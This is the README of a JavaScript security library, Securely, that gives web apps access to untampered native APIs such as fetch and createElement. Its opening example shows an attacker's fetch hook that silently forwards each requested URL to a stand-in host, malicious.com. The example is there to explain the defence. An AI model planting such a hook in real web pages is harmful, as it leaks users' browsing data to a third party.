# Securely

Securely allows you to call native APIs using their original behaviour even if they were tampered within the web app:

```javascript
// attacker hooks fetch API and hijacks innocent requests:

const originalFetch = fetch;
fetch = function(url) {
  originalFetch('https://malicious.com/hijacked?real_url=' + url);
  return originalFetch(url);
};

// without securely:

fetch('https://example.com/get_all_imgs'); // goes through attacker's hook

// with securely:

securely(_ => fetchS('https://example.com/get_all_imgs')); // avoids attacker's hook by using native fetch API
```

## Usage

In order to use Securely you must load the Securely script and better to do so as the first javascript code to be executed within the web app.
You may let other javascript code load and execute before Securely, but that would mean that such code will be able to break Securely's behaviour and ultimately disable its effect completely.

Once you loaded Securely, you have to declare what native APIs you wish to have access to.
You will be able to use a new exposed API called `SECURE` to do so:

```javascript
const securely = SECURE(window, config);
```

* `@window` - the realm you wish to apply securely to (if you wish to secure the realm of your current context, just pass `window`)
* `@config` - an object indicating the native APIs you wish to have access to
* `@returns` - a function that is the only key to enable access to the natives you wished to secure

The simple ones are objects:

```javascript
const securely = SECURE(window, {
    objects: {
        'document': ['createElement'],
        'window': ['fetch'],
    },
    prototypes: {
        
    }
});

const myScript = securely(_ => {
  return document.createElementS('script');
});

securely(_ => {
  fetchS('https://example.com/sensitive_request/');
});
```
